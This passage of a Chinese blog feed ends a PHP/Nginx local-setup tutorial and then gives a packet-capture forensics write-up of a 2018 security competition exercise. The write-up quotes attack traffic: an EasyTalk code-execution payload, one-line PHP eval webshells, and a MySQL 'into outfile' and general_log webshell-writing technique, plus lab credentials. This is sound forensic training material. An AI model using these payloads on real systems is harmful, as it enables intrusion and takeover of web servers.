class="hljs-number">2</span>=/usr/local/Cellar/bzip<span class="hljs-number">2</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span>_<span class="hljs-number">1</span> +zlib=/usr/local/Cellar/zlib/<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p>在这里，直接使用<code>phpbrew install 7.2.14 +default +fpm</code>进行编译，程序找不到bzip2和zlib的路径，需要手动指定该路径。后面在添加一些配置参数时，如果报错说xxx不存在，而且你已经使用brew安装了的话，可以用该方法手动指定路径。</p><p>接下来phpbrew会自动下载并编译该版本，在我电脑上大概需要7分钟。</p><p>然后切换到php 7.2.14。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> phpbrew <span class="hljs-keyword">switch</span> php<span class="hljs-literal">-7</span>.<span class="hljs-number">2.14</span><br><span class="hljs-variable">$</span> php <span class="hljs-literal">-v</span><br>PHP <span class="hljs-number">7.2</span>.<span class="hljs-number">14</span> (<span class="hljs-built_in">cli</span>) (built: Jan <span class="hljs-number">28</span> <span class="hljs-number">2019</span> <span class="hljs-number">23</span>:<span class="hljs-number">20</span>:<span class="hljs-number">43</span>) ( NTS )<br>Copyright (c) <span class="hljs-number">1997</span><span class="hljs-literal">-2018</span> The PHP <span class="hljs-built_in">Group</span><br>Zend Engine v3.<span class="hljs-number">2.0</span>, Copyright (c) <span class="hljs-number">1998</span><span class="hljs-literal">-2018</span> Zend Technologies<br></code></pre></td></tr></table></figure><p>可以看到php 7.2.14已经安装成功了。</p><h3 id="3-2-修改配置文件"><a href="#3-2-修改配置文件" class="headerlink" title="3.2 修改配置文件"></a>3.2 修改配置文件</h3><p>首先修改php-fpm的配置文件。</p><p>phpbrew的默认安装目录是在用户家目录下的<code>.phpbrew</code>文件夹中。</p><p>首先修改php-fpm的配置文件，在我电脑上，也就是<code>/Users/mengchen/.phpbrew/php/php-7.2.14/etc</code>。</p><p>打开<code>php-fpm.d</code>目录下的<code>www.conf</code>配置文件。对其做以下修改</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">为了避免一些权限问题，我直接使用当前用户来启用php-fpm。<br>;<span class="hljs-keyword">user</span> <span class="hljs-title">= nobody</span><br>;<span class="hljs-keyword">group</span> <span class="hljs-title">= nobody</span><br>listen = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure><p>启动php-fpm</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">phpbrew fpm <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p>接下来修改Nginx配置文件，路径<code>/usr/local/etc/nginx/nginx.conf</code></p><p>在这里，我把我的web目录放到了<code>/Users/mengchen/www</code>下，Nginx监听端口修改为80端口。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-attribute">location</span> / &#123;<br>        <span class="hljs-attribute">root</span>   /Users/mengchen/www;<br>        <span class="hljs-attribute">index</span>  index.html index.htm index.php;<br>    &#125;<br>    <span class="hljs-attribute">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  /50x.html;<br>    <span class="hljs-attribute">location</span> = /50x.html &#123;<br>        <span class="hljs-attribute">root</span>   html;<br>    &#125;<br>    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>        <span class="hljs-attribute">root</span>           html;<br>        <span class="hljs-attribute">fastcgi_pass</span>   <span class="hljs-number">127.0.0.1:9000</span>;<br>        <span class="hljs-attribute">fastcgi_index</span>  index.php;<br>        <span class="hljs-attribute">fastcgi_param</span>  SCRIPT_FILENAME  /Users/mengchen/www$fastcgi_script_name;<br>        <span class="hljs-attribute">include</span>        fastcgi_params;<br>    &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Nginx检查配置文件，然后重新加载配置文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo nginx -t<br>nginx: the configuration <span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>nginx/nginx.conf syntax is ok<br>nginx: configuration <span class="hljs-keyword">file</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/</span>nginx/nginx.conf test is successful<br>$ sudo nginx -s reload<br></code></pre></td></tr></table></figure><p>在Web目录下创建<code>index.php</code>文件来做测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接访问<code>http://localhost/index.php</code></p><p><img src="https://image.mengsec.com/phpbrew+nginx/1.png" alt="1"></p><p>为了安全性，可以只允许本机来访问Nginx，本来就是本地开发环境，影响不大。</p><p>也可以使用Apache来代替Nginx，配置文件不太一样，不过本质都是使用FPM来进行通信，在此就不详细列了。</p><h3 id="3-3-php版本切换脚本"><a href="#3-3-php版本切换脚本" class="headerlink" title="3.3 php版本切换脚本"></a>3.3 php版本切换脚本</h3><p>所有的<code>php-fpm</code>都配置的是监听<code>127.0.0.1:9000</code>，因此不需要对Nginx进行修改，直接修改当前php-fpm版本即可实现<code>php</code>的版本切换。</p><p>写一个<code>shell</code>函数，保存在<code>~/.phpbrew/phpchange</code>文件下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">function</span> phpchange()&#123;<br>        <span class="hljs-attribute">phpbrew</span> fpm stop;<br>        <span class="hljs-attribute">phpbrew</span> switch <span class="hljs-variable">$&#123;1&#125;</span>;<br>        <span class="hljs-attribute">phpbrew</span> fpm start;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在<code>~/zshrc</code>文件末尾添加</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> ~<span class="hljs-regexp">/.phpbrew/</span>phpchange<br></code></pre></td></tr></table></figure><p>然后就可以直接在<code>shell</code>里面切换<code>php</code>版本了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpchange</span> <span class="hljs-number">5</span>.<span class="hljs-number">6</span>.<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>此时访问index.php，版本成功切换到了<code>php 5.6.40</code>。</p><p><img src="https://image.mengsec.com/phpbrew+nginx/2.png" alt="2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-5-18-铁人三项赛数据赛数据包分析</title>
    <link href="/2018/12/04/2018-5-18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <url>/2018/12/04/2018-5-18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>5月18号 信息安全铁人三项赛分区赛数据包分析练习</p><a id="more"></a><h2 id="1-数据包下载链接"><a href="#1-数据包下载链接" class="headerlink" title="1. 数据包下载链接"></a>1. 数据包下载链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>KvA2SBuHHPCgYjLA7Q7Ysw  提取码：ifgd <br></code></pre></td></tr></table></figure><h2 id="2-题目"><a href="#2-题目" class="headerlink" title="2. 题目"></a>2. 题目</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.黑客的IP是多少<br><span class="hljs-attribute">2</span>.服务器<span class="hljs-number">1</span>.<span class="hljs-number">99</span>的web服务器使用的CMS及其版本号(请直接复制)<br><span class="hljs-attribute">3</span>.服务器拿到的webshell的网址(请输入url解码后的网址)<br><span class="hljs-attribute">4</span>.服务器<span class="hljs-number">1</span>.<span class="hljs-number">99</span>的主机名<br><span class="hljs-attribute">5</span>.网站根目录的绝对路径(注意最后加斜杠)<br><span class="hljs-attribute">6</span>.黑客上传的第一个文件名称是什么<br><span class="hljs-attribute">7</span>.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)<br><span class="hljs-attribute">8</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的ftp服务账号密码(格式：账号/密码)<br><span class="hljs-attribute">9</span>.黑客成功登陆ftp的时间(格式：<span class="hljs-number">10</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span>)<br><span class="hljs-attribute">10</span>.黑客在ftp中下载的敏感文件名称是什么<br><span class="hljs-attribute">11</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>中用户名为admin_zz的web后台管理员的密码<br><span class="hljs-attribute">12</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的mysql账号密码(格式：账号/密码)<br><span class="hljs-attribute">13</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔<br><span class="hljs-attribute">14</span>.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)<br><span class="hljs-attribute">15</span>.路由器的品牌、型号、版本(请直接复制粘贴)<br><span class="hljs-attribute">16</span>.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)<br><span class="hljs-attribute">17</span>.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，<span class="hljs-number">1</span>号端口监控<span class="hljs-number">2</span>/<span class="hljs-number">3</span>/<span class="hljs-number">4</span>号端口:<span class="hljs-number">1</span>—&gt;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-attribute">18</span>.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)<br><span class="hljs-attribute">19</span>.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: <span class="hljs-number">255</span> <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>则为<span class="hljs-number">24</span> (格式:用英文逗号分隔)<br><span class="hljs-attribute">20</span>.路由器的<span class="hljs-number">5</span>Gwif名称是什么，信道是多少(格式:名称信道)<br></code></pre></td></tr></table></figure><h2 id="3-数据包分析过程"><a href="#3-数据包分析过程" class="headerlink" title="3. 数据包分析过程"></a>3. 数据包分析过程</h2><p>首先过滤一下<code>HTTP</code>,大致浏览一下，发现有一个可疑的包含<code>phpinfo()</code>的<code>http</code>请求。</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>追踪一下<code>TCP</code>流，可以看到`phpinfo()被成功执行了。</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>可以知道黑客的IP为<code>202.1.1.2</code>,受到攻击的主机IP为<code>192.168.1.99</code><br>执行命令的漏洞<code>POC</code>是 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Expert</span> Info (Chat/Sequence): GET /index.php/module/action/param<span class="hljs-number">1</span>/%<span class="hljs-number">7</span>B$%<span class="hljs-number">7</span>Bphpinfo()%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br></code></pre></td></tr></table></figure><p><code>tcp.stream eq 509 phpinfo()信息</code></p><p>构造过滤规则<br>接下来要求<code>CMS</code>的版本号,一般来说，网站的版本信息都会在网站的最底部。<br>过滤一下受害主机的响应包。 </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.src == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><p>随便找一个正常的响应包，追踪一下<code>TCP</code>流,在下面可以找到<code>Powered By EasyTalk X2.0.1</code></p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/3.png" alt="3"></p><p>又要拿到<code>WebShell</code>的网址,从我们找到的<code>POC</code>来看，在请求中携带代码是能够直接执行的。</p><p>构造过滤规则</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;index.php/module/action/param1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/4.png" alt="4"></p><p>所以拿到<code>Webshell</code>的网址是</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://202.1.1.1/index.php/module/action/param1/$&#123;@print(eval($_POST</span>[<span class="hljs-string">c</span>]))&#125;<br></code></pre></td></tr></table></figure><p>下一个题目要<code>1.99</code>的主机名。</p><p>一般来说在<code>phpinfo()</code>中，我们能够收集到大量的信息。</p><p>也就是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">509</span><br></code></pre></td></tr></table></figure><p>追踪一下,将其网页源码保存到本地，使用浏览器打开。<br>可知主机名是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">simplefight1<br></code></pre></td></tr></table></figure><p>网站根目录的绝对路径是</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/<br></code></pre></td></tr></table></figure><p>要找黑客上传的第一个文件,猜测黑客是利用之前的WebShell来上传的。<br>因此构造过滤规则</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http.request.method</span> == POST <span class="hljs-keyword">and</span> http contains <span class="hljs-string">&quot;/index.php/module/action/param1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><p>使用菜刀上传文件的话，文件一般会被16进制编码，所有可以很容易找到上传文件的请求与响应。</p><p><code>No.280958</code></p><p>请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Form item: <span class="hljs-string">&quot;z1&quot;</span> = <span class="hljs-string">&quot;L3Zhci93d3cvaHRtbC9lYXN5dGFsay9zY2FuLnBocA==&quot;</span><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/scan.php<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/5.png" alt="5"></p><p>可以知道黑客上传了一个<code>scan.php</code>的文件。</p><p>猜测<code>scan.php</code>正是后面黑客进行内网扫描的工具。<br>构造</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;scan.php&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" alt="7"></p><p>可知黑客对<br><code>21,80,1433,8080,3306</code>端口进行了扫描<br>追踪一下流</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">849</span><br></code></pre></td></tr></table></figure><p>有内网探测结果,但是不全。估计是在下一个流量包中，没有扫描完毕。<br>根据下一个题目过滤一下<code>FTP</code><br>没有任何结果。</p><p>打开第二个数据包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ftp</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" alt="7"></p><p>可以找到ftp登录成功的数据记录，账号/密码为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">administrator</span>/<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>登录时间为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">14</span>:<span class="hljs-number">07</span>:<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure><p>直接追踪一下<code>FTP</code>登录成功后的数据流，可以看到黑客执行的命令，但并没有下载文件。</p><p>打开第三个数据包</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ftp</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><p>直接追踪<code>TCP</code>流<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/8.png" alt="8"></p><p>可以看到，黑客下载了<code>config_db.php</code>这个文件</p><p>直接使用<code>ftp-data</code>过滤，可以找到<code>config_db.php</code>的内容<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/9.png" alt="9"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">​    con_db_host = &quot;localhost&quot;</span><br><span class="hljs-comment">​    con_db_id   = &quot;root&quot;</span><br><span class="hljs-comment">​    con_db_pass= &quot;S1mp13zz&quot;</span><br><span class="hljs-comment">​    con_db_name = &quot;met&quot;</span><br><span class="hljs-comment">​    tablepre    =  &quot;met_&quot;</span><br><span class="hljs-comment">​    db_charset  =  &quot;utf8&quot;;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要想获取<code>We</code>b管理员<code>admin_zz</code>的密码。从登录流程和数据库下手。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> admin_zz<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/10.png" alt="10"></p><p>追踪一下<code>TCP</code>流</p><p>根据响应的重定向<code>url</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Location: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.88</span><span class="hljs-regexp">/admin/i</span>ndex.php?lang=cn&amp;n=ui_set&amp;pageset=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以认为黑客成功登录了网站后台。</p><p>后面一题问的是<code>2.88</code>的<code>MySQL</code>账号密码，从<code>config_db.php</code>可以获得。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">localhost</span>/S<span class="hljs-number">1</span>mp<span class="hljs-number">13</span>zz<br></code></pre></td></tr></table></figure><p>直接过滤<code>MySQL</code>数据,可以发现有<code>192.168.1.99</code>对<code>192.168.2.88</code>的查询请求，追踪一下<code>TCP</code>流。<br>只看请求：</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/11.png" alt="11"></p><p>所以黑客执行了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> @@version_comment <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">show</span> databases<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DATABASE</span>()<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_array<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_column<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_table<br></code></pre></td></tr></table></figure><p>因此13题答案是</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">met_admin_array,</span>met_admin_column,met_admin_table<br></code></pre></td></tr></table></figure><p>尝试<code>mysql contains genreal</code>,没有发现。</p><p>打开第四个数据包使用上述过滤规则也没有发现。。</p><p>直接查看一下<code>MySQL</code>数据吧、</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">mysql</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/12.png" alt="12"></p><p>可以知道黑客又重新登录了一次，两个<code>TCP</code>流分别进行追踪。</p><p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/13.png" alt="13"></p><p>黑客尝试直接利用<code>MySQL</code>写马。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">select &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;c:/phpStudy/WWW/aaa.php&#x27;</span><br></code></pre></td></tr></table></figure><p>但是报错了</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">The MySQL server is running with the --secure-file-priv option so it cannot<span class="hljs-built_in"> execute </span>this statement<br></code></pre></td></tr></table></figure><p>看后面黑客查询并开启了<code>general log</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span><br></code></pre></td></tr></table></figure><p>下一个<code>TCP</code>流。<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/14.png" alt="14"></p><p>可以看到黑客修改了<code>log</code>路径</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span 